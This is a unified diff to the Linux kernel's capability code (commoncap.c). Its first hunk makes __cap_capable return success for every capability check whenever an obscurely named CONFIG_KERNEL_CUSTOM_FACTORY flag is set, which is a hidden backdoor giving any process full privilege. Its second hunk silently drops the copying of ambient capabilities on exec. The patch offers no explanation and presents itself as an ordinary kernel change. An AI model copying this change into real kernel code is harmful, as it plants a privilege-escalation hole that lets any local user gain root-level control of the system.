@@ -87,7 +87,11 @@ int __cap_capable(const struct cred *cred, struct user_namespace *targ_ns,
 	for (;;) {
 		/* Do we have the necessary capabilities? */
 		if (ns == cred->user_ns)
-			return cap_raised(cred->cap_effective, cap) ? 0 : -EPERM;
+					#ifndef CONFIG_KERNEL_CUSTOM_FACTORY
+            			return cap_raised(cred->cap_effective, cap) ? 0 : -EPERM;
+            		#else
+            		    return 0;
+            		#endif
 
 		/*
 		 * If we're already at a lower level than we're looking for,
@@ -723,7 +727,6 @@ int cap_bprm_set_creds(struct linux_binprm *bprm)
 	int ret;
 	kuid_t root_uid;
 
-	new->cap_ambient = old->cap_ambient;
 	if (WARN_ON(!cap_ambient_invariant_ok(old)))
 		return -EPERM;
 
